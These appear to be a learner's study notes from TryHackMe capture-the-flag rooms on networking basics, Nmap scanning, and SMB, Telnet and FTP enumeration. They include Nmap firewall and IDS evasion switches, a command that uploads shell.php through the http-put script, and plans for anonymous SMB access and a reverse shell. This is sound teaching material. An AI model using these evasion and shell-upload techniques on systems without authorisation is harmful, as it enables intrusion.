# Introductory Research

> Without a doubt, the ability to research effectively is **the most** important quality for a hacker to have. By it's very nature, hacking requires a *vast* knowledge base -- because how are you supposed to break into something if you don't know how it works?

The thing is: no one knows everything. Everyone (professional or amateur, experienced or new) will encounter problems which they don't automatically know how to solve. This is where research comes in, as, in the real world, you can't ever expect to simply be handed the answers to your questions.

As your experience level increases, you will find that the things you're researching scale in difficulty accordingly; however, in the field of information security, there will never come a point where you don't need to look things up.

This room will serve as a brief overview of some of the most important resources available to you, and will hopefully aid you in the process of building a research methodology that works for you.

- An example of a research question
- Vulnerability searching tools
- Linux Manual pages

### Example Research Question

We'll begin by looking at a typical research question: the kind that you're likely to find when working through a CTF on TryHackMe.

You've downloaded a JPEG file from a remote sever. You suspect that there's something hidden inside it, but how can you get it out?
How about we start by searching for "hiding things inside images" in Google.

The second link down gives the the title of the technique, "Steganography". You can then click that link and read the document, which will teach you *how* files are hidden inside images.

Ok, so we know now how it's done, let's try searching for a way to extract files using steganography.

### Vulnerability Searching

> Often in hacking you'll come across software that might be open to exploitation. For example, Content Management Systems (such as Wordpress, FuelCMS, Ghost, etc.) are frequently used to make setting up a website easier, and many of these are vulnerable to various attacks.
> 	So where would we look if we wanted to exploit specific software?

The answer lies with website such as:

- https://www.exploit-db.com/
- https://nvd.nist.gov/vuln/search
- https://cve.mitre.org/

NVD keep track of CVEs (**Common Vulnerabilities and Exposures**) -- whether or not there is an exploit publicly available -- so it's a really good place to look if you're searching for vulnerabilities in a specific piece of software. 

> CVEs take the form: CVE-YEAR-IDNUMBER

**ExploitDB** tends to be very useful for hackers, as it often actually contains exploits that can be downloaded and used straight out of the box. It tends to be one of the first stops when you encounter software in a CTF or pentest.

If you're inclined towards the CLI on Linux, Kali comes pre-installed with a tool called "searchsploit" which allows you to search ExploitDB from your own machine
- This is offline, and works using a downloaded version of the database, meaning that you already have all of the exploits already on your Kali Linux. 

### Manual Pages

> Kali Linux is probably the most ubiquitous operating system used in hacking, so it pays to be familiar with it!

One of the many useful features of LInux is the inbuilt `man` command, which gives you access to the manual pages for most tools directly inside your terminal. Occasionally you'll find a tool that doesn't have a manual entry; however, this is rare. Generally speaking, when you don't know how to use a tool, `man` should be your first port of call.

> You have been told in school that there are good and bad sources of information. That may be true when it comes to essays and referencing information; however, it's my pleasure to state that it does not apply here.

Any information can potentially be useful -- so feel free to use blogs, wikipedia, or anything else that contains what you're looking for. Blogs especially can often be very valuable for learning when it comes to InfoSec, as many security researchers keep a blog.

# Network Exploitation Basics

### The OSI Model:

> There are seven layers to the OSI model

| OSI          |
| ------------ |
| Application  |
| Presentation |
| Session      |
| Transport    |
| Network      |
| Data Link    |
| Physical     |
**Layer 7: Application**

The application layer of the OSI model essentially provides networking options to programs running on a computer. It works almost exclusively with applications, providing an interface for them to use in order to transmit data.

When data is given to the application layer, it is passed down into the presentation layer.

**Layer 6: Presentation**

Received data from the application layer. This data tends to be in a format that the application understands, but it's not necessarily in a standardized format that could be understood by the application layer in the *receiving* computer.

The presentation layer translates the data into a standardized format, as well as handling any *encryption*, *compression* or other transformations to the data. With this complete, data is passed down to the Session layer

**Layer 5: Session**

When the session layer receives the correctly formatted data from the presentation layer, it looks to see if it can set up a connection with the other computer across the network. If it can't then it sends back an error and the process goes no further.

If a session *can* be established, then it's the job of the session layer to maintain it, as well as cooperate with the session layer of the remote computer in order to synchronize communications. The session layer is particularly important as the session that it creates is unique to the communication in question. 

This is what allows you to make multiple requests to different endpoints simultaneously without all the data getting mixed up (think about opening two tabs in the browser at the same time). When the session layer has successfully logged a connection between the host and remote computer the data is passed down to Layer 4: transport layer.

**Layer 4: Transport**

The transport layer is an interesting layer that serves numerous important functions. Its first purpose is to choose the protocol over which the data is to be transmitted. The two most common protocols in the transport layer are **TCP (Transport Control Protocol)** and **UDP (User Datagram Protocol)**; with TCP the transmission is *connection-based* which means that a connection between the computers is established and maintained for the duration of the request. This allows the two computers to remain in constant communication to ensure that the data is sent at an acceptable speed, and that any data lost is resent.

With UDP, the opposite is true; packets of data are essentially thrown at the receiving computer -- if it can't keep up then that's *its problem*. What this means is that TCP would usually be chosen for situations where accuracy is favored over speed (file transfer, loading webpages) an UDP would be optimal for situations where speed is more important (video conferencing, streaming)

When a protocol is selected, the transport layer divides the transmission up into bite-sized pieces (over TCP these are called *segments*, over UDP they're called *datagrams*), which makes it easier to transmit the message succesfully.

**Layer 3: Network**

The network layer is responsible for locating the destination of your request. For example, the Internet is a huge network; when you want to request information from a webpage, it's the network layer that takes the IP address for the page and figures out the best route to take. 

At this stage we're working with what is referred to as *Logical* addressing (i.e. IP addresses) which are still software controlled. Logical addresses are used to provide order to networks, categorizing them and allowing us to properly sort them.

Currently the most common form of logical addressing is the IPv4 format.

**Layer 2: Data Link**

The data link layer focuses on the *physical* addressing of the transmission. It receives a packet from the network layer (that includes the IP address for the remote computer) and adds in the physical (MAC) address of the receiving endpoint. Inside every network enabled computer is a **Network Interface Card** which comes with a unique MAC (**Media Access Control**) address to identify it.

MAC addresses are set by the manufacturer and literally burnt into the card, they can't be changed, but they can be *spoofed.* 

Additionally, it is the data link layer's job to present the data in a format suitable for transmission.
 
**Layer 1: Physical**

The physical layer is right down to the hardware of the computer. This is where the electrical pulses that make up data transfer over a network are sent and received. 

It's the job of the physical layer to convert the binary data of the transmission into signals and transmit them across the network, as well as receiving incoming signals and converting them back into binary data. 

### Encapsulation

> As the data is passed down each layer of the model, more information containing details specific to the layer in question is added on to the start of the transmission.

As an example,  the header added by the Network Layer would include things like the source and destination IP addresses, and the header added by the transport layer would include information specific to the protocol being used. 

The *data link layer* also adds a piece on at the *end* of the transmission, which is used to verify that the data has not been corrupted on transmission; this also has the added bonus of increased security, as the data can't be intercepted and tampered with without breaking the trailer.

When a message is received by the second computer, the OSI model reverses, starting at the physical and working up until it reaches the application layer, stripping off the added information as it goes. 
- This is referred to as *de-encapsulation*. 

The processes of encapsulation and de-encapsulation are very important -- not least because of their practical use, but also because they give us a standardised method for sending data.
- This means that all transmissions will consistently follow the same methodology, allowing any network enabled device to send a request to any other reachable device and be sure that it will be understood -- regardless of whether they are from the same manufacturer; use the same operating system; or any other factors.

### The TCP/IP Model

> Serves as the basis for real world networking. The TCP/IP model consists of four layers: Application, Transport, Internet and Network Interface. 

Between them, these cover the same range of functions as the seven layers of the OSI Model.

_**Note:** Some recent sources split the TCP/IP model into five layers -- breaking the Network Interface layer into Data Link and Physical layers (as with the OSI model). This is accepted and well-known; however, it is not officially defined (unlike the original four layers which are defined in RFC1122). It's up to you which version you use -- both are generally considered valid._

The two networking models match up something like this:

| OSI          | TCP/IP            |
| ------------ | ----------------- |
| Application  | Application       |
| Presentation |                   |
| Session      |                   |
| Transport    | Transport         |
| Network      | Internet          |
| Data Link    | Network Interface |
| Physical     |                   |

> The process of encapsulation and de-encapsulation works in the exact same way as with the OSI model.

A layered model is great as a visual aid -- it shows us the general process of how data can be encapsulated and sent across a network, but how does it actually happen?

When we talk about TCP/IP, it's all well and good to think about a table with four layers in it, but we're actually talking about a suite of protocols -- sets of rules that define how an action is to be carried out. TCP/IP takes its name from the two most important of these: **Transmission Control Protocol** and **Internet Protocol**

**TCP** controls the flow of data between two endpoints
**Internet Protocol** controls how packets are addressed and sent

TCP is a *connection-based* protocol. In other words, before you send any data via TCP, you must first form stable connection between the two computers. The process of forming this connection is called the *three-way-handshake*. 

**History:**

It's important to understand exactly _why_ the TCP/IP and OSI models were originally created. To begin with there was no standardisation -- different manufacturers followed their own methodologies, and consequently systems made by different manufacturers were completely incompatible when it came to networking. The TCP/IP model was introduced by the American DoD in 1982 to provide a standard -- something for all of the different manufacturers to follow. This sorted out the inconsistency problems. Later the OSI model was also introduced by the International Organisation for Standardisation ([ISO](https://www.iso.org/home.html)); however, it's mainly used as a more comprehensive guide for learning, as the TCP/IP model is still the standard upon which modern networking is based.

### Networking Tools: Ping

> The `ping` command is used when we want to test whether a connection to a remote resource is possible. Usually this will be a website on the internet, but it could also be for a computer on your home network if you want to check if it's configured correctly.

Ping works using the ICMP protocol, which is one of the slightly less well known TCP/IP protocols that were mentioned earlier.
- ICMP works on the network layer of the OSI model, and thus the internet layer of the TCP/IP model.

The basic syntax for ping is `ping <target>`

> Notice that the ping command actually returned the IP address for the Google server that it connected to, rather than the URL that was requested. This is a handy secondary application for ping, as it can be used to determine the IP address of the server hosting a website.

### Networking Tools: traceroute

The logical followup to the ping command is 'traceroute'. **Traceroute** can be used to map the path your request takes as it heads to the target machine.

> The internet is made up of many, many different services and end-points, all networked up to each other. This means that, in order to get the content you actually want, you first need to go through a bunch of other servers.
> 	Traceroute allows you to see each of these connections -- it allows you to see every intermediate step between your computer and the resource that you requested. The basic syntax for traceroute on Linux is this: `traceroute <destination>`

By default, the Windows traceroute utility (`tracert`) operates using the same ICMP protocol that ping utilises, and the Unix equivalent operates over UDP. This can be altered with switches in both instances.

### Networking Tools: WHOIS

Domain names -- the unsung heroes of the internet.

> For now, suffice to know that a domain translates into an IP address so that we don't need to remember it (e.g. you can type tryhackme.com, rather than the TryHackMe IP address). Domains are leased out by companies called Domain Registrars. If you want a domain, you go and register with a registrar, then lease the domain for a certain length of time.

Enter WHOIS.

`WHOIS` essentially allows you to query who a domain name is registered to. In Europe personal details are redacted; however, elsewhere you can potentially get a great deal of information from a whois search. 

WHOIS lookups are very easy to perform, just use `whois <domain>` to get a list of available information about the domain registration.

### Networking Tools: dig

> At the most basic level, DNS allows us to ask a special server to give us the IP address of the website we're trying to access.
> 	For example, if we made a request to www.google.com, our computer would first send a request to a special DNS server (which your computer already knows how to find). 
> 	The server would then go looking for the IP address for Google and send it back to us. Our computer would then send the request to the IP of the Google server.

1. You make a request to a website. The first thing that your computer does is check its local "**Hosts File**" to see if an explicit IP=>Domain mapping has been created. This is an older system that DNS and much less commonly used in modern environments; however, it still takes precedence in the search order for most operating systems. If no mapping has been manually created, the computer then checks its local DNS cache to see if it already has an IP address stored for the website; if it does, great. If not, it goes to the next stage of the process.
2. Assuming the address hasn't already been found, your computer will then send a request to what is known as a *recursive DNS server*. These will automatically be known to the router on your network. Many Internet Service Providers (ISPs) maintain their own recursive servers, but companies such as Google and OpenDNS also control recursive servers. This is how your computer automatically knows where to send the request for information: details for a recursive DNS server are stored in your router or computer. This server will also maintain a cache of results for popular domains; however, if the website you've requested isn't stored in the cache, the recursive server will pass the request on to a _root name_ server.
3. Before 2004 there were precisely 13 root name DNS servers in the world. These days there are many more; however, they are still accessible using the same 13 IP addresses assigned to the original servers (balanced so that you get the closest server when you make a request). The root name servers essentially keep track of the DNS servers in the next level down, choosing an appropriate one to redirect your request to. These lower level servers are called _Top-Level_ _Domain_ servers.
4. *Top-Level Domain* servers are split up into extensions. So, for example, if you were searching for tryhackme.com your request would be redirected to a TLD server that handled `.com` domains. If you were searching for bbc.co.uk your request would be redirected to a TLD server that handles `.co.uk` domains. As with root name servers, TLD servers keep track of the next level down: *Authoritative name servers*. When a TLD server receives your request for information, the server passes it down to an appropriate Authoritative name server.
5. Authoritative name servers are used to store DNS records for domains directly. In other words, every domain in the world will have its DNS records stored on an Authoritative name server somewhere or another; they are the source of the information. When your request reaches the authoritative name server for the domain you're querying, it will send the relevant information back to you, allowing your computer to connect to the IP address behind the domain you requested.

##### Back to Dig

When you visit a website in your web browser this all happens automatically, but can also do it manually with a tool called `dig`. 
- Like `ping` and `traceroute`, dig should be installed automatically on Linux systems.

`Dig` allows us to manually query recursive DNS servers of our choice for information about domains.

> It is a very useful tool for network troubleshooting.

Another interesting piece of information that dig gives us is the TTL (**T**ime **T**o **L**ive) of the queried DNS record. As mentioned previously, when your computer queries a domain name, it stores the results in its local cache. The TTL of the record tells your computer when to stop considering the record as being valid -- i.e. when it should request the data again, rather than relying on the cached copy.

> The **TTL** can be found in the second column of the answer section.

# Nmap

> When it comes to hacking, knowledge is power.
> The more knowledge you have about a target system, the more options that are available. This makes it imperative that proper enumeration is carried out before any exploitation attempts are made.

Before carrying out an attack, we need to get an idea of the landscape we are working in. 

- What this means is that we need to establish which services are running on the targets. For example, perhaps one of them is running a webserver, and another is acting as a Windows Active Directory Domain Controller.
- The first stage in establishing this "map" of the landscape is something called **portscanning**. 
	- When a computer runs a network service, it opens a networking construct called a "port" to receive the connection. 
	- Ports are necessary for making multiple network requests or having multiple services available. 

For example, when you load several webpages at once in the web browser, the program must have some way of determining which tab is loading which web page. 

What happens when you connect to multiple computers at the same time? Your computer opens up a separate, different high numbered port (at random) which it uses for all its communications with the remote server.

### Nmap Switches

> Like most pentesting tools, nmap is run from the terminal. There are versions available for both Windows and Linux. For this room we will assume that you are using Linux; however, the switches should be identical. 

Nmap is installed by default on both Kali Linux and TryHackMe Attack Box.

Nmap can be accessed by typing `nmap` into the terminal command line, followed by some of the switches (command arguments which tell a program to do different things) we will be covering below.

All you'll need for this is the help menu for nmap (accessed with `nmap -h`) and/or the man page (access with `man nmap`). 

### Scan Types

When port scanning with Nmap, there are three basic scan types. These are:

- TCP Connect Scans (`-sT`)
- SYN "Half-open" Scans (`-sS`)
- UDP Scans (`-sU`)

Additionally there are several less common port scan types, some of which we will also cover (albeit in less detail). These are:

- TCP Null Scans (`-sN`)
- TCP FIN Scans (`-sF`)
- TCP Xmas Scans (-`sX`)

> Most of these, with the exception of UDP scans, are used for very similar purposes, however, the way that they work differs between each scan. This means that, whilst one of the first three scans are likely to be your go-to in most situations, it's worth bearing in mind that other scan types exist.

In terms of network scanning, we will also look briefly at ICMP (or "ping") scanning.

### TCP Connect Scans

To understand TCP connect scans (`-sT`), it's important that you're comfortable with the *TCP Three Way Handshake*.

As a brief recap, the three-way handshake consists of three stages. First, the connecting terminal (our attacking machine, in this instance) sends a TCP request to the target server with the SYN flag set.  

The server then acknowledges this packet with a TCP response containing the SYN flag, as well as the ACK flag. Finally, our terminal completes the handshake by sending a TCP request with the ACK flag set. 

Finally, our terminal completes the handshake by sending a TCP request with the ACK flag set. 

**So how does this relate to Nmap?**

Well, as the name suggests, a TCP Connect scan works by performing the three-way handshake with each target port in turn. In other words, Nmap tries to connect to each specified TCP port, and determines whether the service is open by the response it receives.

> If Nmap sends a TCP request with the SYN flag set to a closed port, the target server will respond with a TCP packet with the RST (Reset) flag set. By this response, Nmap can establish that the protocol is closed.
> 	If, however, the request is sent to an *open* port, the target will respond with a TCP packet with the SYN/ACK flags set. Nmap then marks this port as being *open* (and completes the handshake by sending back a TCP packet with ACK set.)

> What if the Port is hidden, behind a firewall?

Many firewalls are configured to simply drop incoming packets. Nmap sends a TCP SYN request, and receives nothing back. This indicates the port is being protected by a firewall and this the port is considered to be *filtered.*

That said, it is very easy to configure a firewall to respond with a RST TCP packet. For example, in IPtables for Linux, a simple version of the command would be as follows:

```
iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
```

### SYN Scans

As with TCP scans, SYN scans (-sS) are used to scan the TCP port-range of a target or targets; however, the two scan types work slightly differently. SYN scans are sometimes referred to as "*Half-open*" scans, or "*Stealth*" scans. 

Where TCP scans perform a full three-way handshake with the target, SYN scans sends back a RST TCP packet after receiving a SYN/ACK from the server (this prevents the server from repeatedly trying to make the request). 

This has a variety of advantages for us as hackers:

- It can be used to bypass older Intrusion Detection Systems as they are looking out for a full three way handshake. This is no longer the case with modern IDS solutions; it is for this reason that SYN scans are still frequently referred to as "*stealth scans*"
- SYN scans are often not logged by applications listening on open ports, as standard practice is to log a connection once it's been fully established. Again, this plays into the idea of SYN scans being stealthy.
- Without having to bother about completing (and disconnecting from) a three-way handshake for every port, SYN scans are significantly faster than a standard TCP connect scan.

There are a few disadvantages to SYN scans, however:

- They require sudo permissions in order to work correctly in Linux. This is because SYN scans require the ability to create raw packets (as opposed to a the full TCP handshake), which is a privilege only the root user has by default.
- Unstable services are sometimes brought down by SYN scans, which could prove problematic if a client has provided a production environment for the test.

When using a SYN scan to identify closed and filtered ports, the exact same rules as with a TCP Connect scan apply.

If a port is closed then the server responds with a RST TCP packet. If the port is filtered by a firewall then the TCP SYN packet is either dropped, or spoofed with a TCP reset.

In this regard, the two scans are identical: the big difference is in how they handle _open_ ports.

[1] SYN scans can also be made to work by giving Nmap the CAP_NET_RAW, CAP_NET_ADMIN and CAP_NET_BIND_SERVICE capabilities; however, this may not allow many of the NSE scripts to run properly.

### UDP Scans

> Unlike TCP, UDP connections are *stateless*. This means that, rather than initiating a connection with a back-and-forth handshake, UDP connections rely on sending packets to a target port and essentially hoping they make it. This makes UDP superb for connections which rely on speed over quality (e.g. video sharing), but the lack of acknowledgement makes UDP significantly more difficult (and much slower) to scan.

The switch for Nmap UDP is `(-sU)`

When a packet is sent to an open UDP port, there should be no response. When this happens, Nmap refers to the port as being `open|filtered`. In other words, it suspects that the port is open, but it could be firewalled. If it gets a UDP response (which is very unusual), then the port is marked as *open*.

- More commonly there is no response, in which case the request is sent a second time as a double-check. If there is still no response then the port is marked *open|filtered* and Nmap moves on.

When a packet is sent to a *closed* UDP port, the target should respond with an ICMP (ping) packet containing a message that the port is unreachable.

- This clearly identifies closed ports, which Nmap marks as such and moves on.

> Due to this difficulty in identifying whether a UDP is actually open, UDP scans tend to be incredibly slow in comparison to the various TCP scans (in the region of 20 minutes to scan the first 1000 ports, with a good connection).

For this reason it's usually good practice to run an Nmap scan with `--top ports <number>` enabled. For example, scanning with `nmap -sU --top-ports 20 <target>`. Will scan the top 20 most commonly used UDP ports, resulting in a much more acceptable scan time.

When scanning UDP ports, Nmap usually sends *completely empty requests* -- just raw UDP packets. That said, for ports which are usually occupied by well-known services, it will instead send a protocol-specific payload which is more likely to elicit a response from which a more accurate result can be drawn.

### Null, FIN and Xmas

> Null, FIN and Xmas TCP port scans are less commonly used that any of the others we've covered already, so we will not go into a huge amount of depth here. All three are interlinked and are used primarily as they tend to be even stealthier, relatively speaking, than a SYN "stealth" scan. Beginning with NULL scans:

- As the name suggests, NULL scans (`-sN`) are when the TCP request is sent with no flags set at all. 
- As per the RFC, the target host should respond with a RST if the port is closed. 

FIN scans (`-sF`) work in an almost identical fashion; however, instead of sending a completely empty packet, a request is sent with the FIN flag (usually used to gracefully close an active connection). Once again, Nmap expects a RST if the port is closed.

- As with the other two scans in this class, Xmas scans (`-sX`) send a malformed TCP packet and expects a RST response for closed ports.
- It's referred to as an xmas scan as the flags that it sets (PSH URG and FIN) give the appearance of a blinking Christmas tree when viewed as a packet capture in Wireshark.

> The expected response for *open* ports with these scans is also identical, and is very similar to that of a UDP scan. If the port is open then there is no response to the malformed packet.

- Unfortunately (as with open UDP ports), that is *also* an expected behavior if the port is protected by a firewall, so NULL, FIN and Xmas scans will only ever identify ports as being *open|filtered*, *closed* or *filtered*.
- If a port is identified as filtered with one of these scans then it is usually because the target has responded with an ICMP unreachable packet.

> It is also worth noting that while RFC 793 mandates that network hosts respond to malformed packets with a RST TCP packet for closed ports, and don't respond at all for open ports; this is not always the case in practice. 

- In particular Microsoft Windows (and a lot of Cisco network devices) are known to respond with a RST to any malformed TCP packet -- regardless of whether the port is actually open or not. This results in all ports showing up as being closed.

> That said, the goal here is, of course, **firewall evasion**. 
> 	Many firewalls are configured to drop incoming TCP packets to blocked ports which have the SYN flag set (thus blocking new connection initiation requests).
> 	By sending requests which do not contain the SYN flag, we effectively bypass this kind of firewall. 

While good in theory, most modern IDS solutions are savvy to these scan types, so don't rely on them to be 100% effective when dealing with modern system types.

### ICMP Network Scanning

> On first connection to a target network in a black box assignment, our first objective is to obtain a "map" of the network structure -- or, in other words, we want to see which IP addresses can contain active hosts, and which do not.

One way to do this is to by using Nmap to perform a so called "*ping sweep*". This is exactly as the name suggests: Nmap sends an ICMP packet to each possible IP address for the specified network. When it receives a response, it marks the IP address that responded as being alive.

- For reasons we will see later in this task, this is not always accurate; however, it can provide something of a baseline and thus is worth covering.

To perform a ping sweep, we use the `-sn` switch in conjunction with IP ranges which can be specified with either a hyphen (`-`) or CIDR notation. i.e. we could scan the `192.168.0.x` network using:

- `nmap -sn 192.168.0.1-254`

OR:

- `nmap -sn 192.168.0.0/24`

> The `-sn` switch tells nmap not to scan any ports -- forcing it to rely primarily on ICMP echo packets (or ARP requests on a local network, if run with sudo or directly as the root user) to identify targets.

In addition to the ICMP echo requests, the `-sn` switch will also cause nmap to send a TCP SYN packet to port 443 of the target, as well as a TCP ACK (or TCP SYN if not run as root) packet to port 80 of the target.

### NSE Scripts Overview

> The **Nmap Scripting Engine (NSE)** is an incredibly powerful addition to Nmap, extending its functionality quite considerabily. NSE scripts are written in the *Lua* programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them.

The NSE is particularly useful for reconnaissance, however, it is well worth bearing in mind how extensive the script library is. 

There are many categories available. Some useful categories include:

- `safe`: won't affect the target
- `intrusive`: Not safe: likely to affect the target
- `vuln`: Scan for vulnerabilities
- `exploit`: Attempt to exploit a vulnerability
- `auth`: Attempt to bypass authentication for running services (e.g. log into an FTP server anonymously)
- `brute`: Attempt to bruteforce credentials for running services
- `discovery`: Attempt to query running services for further information about the network (e.g. quety and SNMP server)

A more exhaustive list: https://nmap.org/book/nse-usage.html

### Working with the NSE

> In task 3 we looked very briefly at the `--script` switch for activating NSE scripts from the `vuln` category using `--script=vuln`. It should come as no surprise that the other categories work in exactly the same way.
> 	If the command `--script=safe` is run, then any applicable safe scripts will be run against the target (Note: only scripts which target an active service will be activated)

To run a specific script, we would use `--script=<script-name>` e.g. `--script=http-fileupload-exploiter`. 

Multiple scripts can be run simultaneously in this fashion by separating them by a comma. For example: `--script=smb=enum-users,smb-enum-shares`. 

Some scripts require arguments (for example, credentials, if they're exploiting an authenticated vulnerability). These can be given with the `--scripts-args` Nmap switch. An example of this would be the `http-put` script (used to upload files using the PUT method). 
- This takes two arguments: the URL to upload the file to, and the file's location on disk. For example:

`namp -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='.shell/.php'` 

Note that the arguments are separated by commas, and connected to the corresponding script with periods (i.e. `<script-name>.<argument>)` 

A full list of scripts and their corresponding arguments (along with example use cases) can be found here: https://nmap.org/nsedoc/

Nmap scripts come with built-in help menus, which can be accessed using `nmap --script-help <script-name>`. 
- This tends not to be as extensive as in the link given above, however, it can still be used when working locally. 

### Searching for Scripts

So now we know how to use the scripts in Nmap, but we don't yet know how to *find* these scripts.

We have two options for this, which should ideally be used in conjunction with each other. The first is the page of the Nmap website (https://nmap.org/nsedoc/) which contains a list of all official scripts. 

The second is the local storage on your attacking machine. Nmap stores its scripts on Linux at `/usr/share/nmap/scripts`. All of the NSE scripts are stored in this directory by default -- this is where Nmap looks for scripts when you specify them.

> There are two ways to search for installed scripts. One is by using the `/usr/share/nmap/scripts/script.db` file. Despite the extension, this isn't actually a database so much as a formatted text file containing filenames and categories for each available script.

The second way to search for scripts is quite simply to use the `ls` command. 

- For example, we could get the same results as in the previous screenshot by using `ls -l /usr/share/nmap/script/*ftp*`

The same techniques can also be used to search for categories of script. For example:
`grep "safe" /usr/share/nmap/scripts/script.db`

##### Installing New Scripts

Nmap's website contains a list of scripts, so what happens if one of these is missing in the `scripts` directory locally?

- A standard `sudo apt update && sudo apt install nmap` should fix this; however, it's also possible to install the scripts manually by downloading the script from Nmap. 

### Firewall Evasion

> We have already seen some techniques for bypassing firewalls (think stealth scans, along with NULL, FIN and Xmas scans); however, there is another very common firewall configuration which it's imperative we know how to bypass.

Your typical Windows host will, with its default firewall, block all ICMP packets. This presents a problem: not only do we often use *ping* to manually establish the activity of a target, Nmap does the same thing by default. 

- This means that Nmap will register a host with this firewall configuration as dead and not bother scanning it at all. 

So, we need a way to get around this configuration. Fortunately Nmap provides an option for this: `-Pn`, which tells Nmap not to bother pinging the host before scanning it. This means that Nmap will always treat the target host(s) as being alive, effectively bypassing the ICMP block; however, it comes at the price of potentially taking a very long time to complete the scan. (if the host really is dead then Nmap will still be checking and double checking every specified port).

**Note**: It's worth noting that if you're already directly on the local network, Nmap can also use ARP to determine host activity.

> There are a variety of other switches which Nmap considers useful for firewall evasion. We will not go through these in detail, however, they can be found at: https://nmap.org/book/man-bypass-firewalls-ids.html

The following switches are of particular note:

- `-f`: Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
- An alternative to `-f`, but providing more control over the size of the packets: `-mtu <number>`, accepts a maximum transmission unit size to use for the packets sent. This *must* be a multiple of 8. 
- `--scan-delay <time>ms`: used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
- `--badsum`: this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. 

# Network Services

> Explore common network service vulnerabilities and misconfigurations.

### What is SMB?

**Server Message Block** (SMB) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.

Servers make files systems and other resources (printers, named pipes, APIs) available to clients on the network.

Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC2002), NetBEUI or IPX/SPX.

##### How does SMB Work?

Once a connection is established, client can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system.
- However, in the case of SMB, these things are done over the network. 

##### What Runs SMB?

> Windows operating systems since Windows 95 have included client and server SMB protocol support. 
> 	Samba, an open source server that supports the SMB protocol, was released for Unix systems.

### Enumerating SMB

**Enumeration** is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services or any other information that may be valuable to an attacker. 

##### SMB

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information -- you'd be surprised what is sometimes included on these shares.

##### Port Scanning

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.

> Nmap is a great tool for this activity.

##### Enum4Linux

Enum4Linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github: https://github.com/portcullislabs/enum4linux

The syntax of Enum4Linux is simple: "`enum4linux [options] ip`"

| Tag | Function                                     |
| --- | -------------------------------------------- |
| -U  | get userlist                                 |
| -M  | get machine list                             |
| -N  | get namelist dump (different from -U and -M) |
| -S  | get sharelist                                |
| -P  | get password policy information              |
| -G  | get group and member list                    |
|     |                                              |
| -a  | all of the above (full basic enumeration)    |
### Exploiting SMB

**Types of SMB Exploits**

> While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system.

In this case, we're going to be exploiting anonymous SMB share-access- a common misconfiguration that can allow us to gain information that will lead to a shell. 

**Method Breakdown**

So, from our enumeration stage, we know:

- The SMB share location
- The name of an interesting SMB share

**SMBClient**

Because we're trying to access an SMB share, we need a client to access resources on servers. WE will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here: https://www.samba.org/samba/docs/current/man-html/smbclient.1.html

We can remotely access the SMB share using the syntax:

`smbclient //[IP]/[SHARE]`

Followed by the tags:

- -U [name] : to specify there user
- -p [port] : to specify the port

### Understanding Telnet

##### What is Telnet?

> Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server.

The client will then become a virtual terminal - allowing you to interact with the remote host.

##### Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

##### How Does Telnet Work?

The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt. THe user the executes commands on the server by using specific Telnet commands in the Telnet prompt. 

You can connect to a telnet server with the following syntax: `telnet [ip] [port]`

### Enumerating Telnet

##### Enumeration

> We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. 

For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.

##### Port Scanning

Let's start the same way we usually do, with a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine.

> If Telnet is assigned to a **non-standard port**, it is not part of the common ports list, or top 1000 ports that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation phase.

### Exploiting Telnet

> Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.

A **CVE**, short for **Common Vulnerabilities and Exposures**, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

##### Method Breakdown

From our enumeration stage, we know:

- There is a poorly hidden telnet service running on this machine
- The service itself is marked "backdoor"
- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on this machine.

##### Connecting to Telnet

You can connect to a telnet server with the following syntax:

`telnet [ip] [port]`

We're going to keep this in mind as we try to exploit this machine.

##### What is a Reverse Shell?

> a "shell" can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

### Understanding FTP

##### What is FTP?

>File Transfer Protocol is , as the name suggests, a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and - as we'll come to later, relays commands and data in a very efficient way.

##### How Does FTP Work?

> A typical FTP session operates using two channels:
> 	a command (sometimes called the control) channel
> 	a data channel

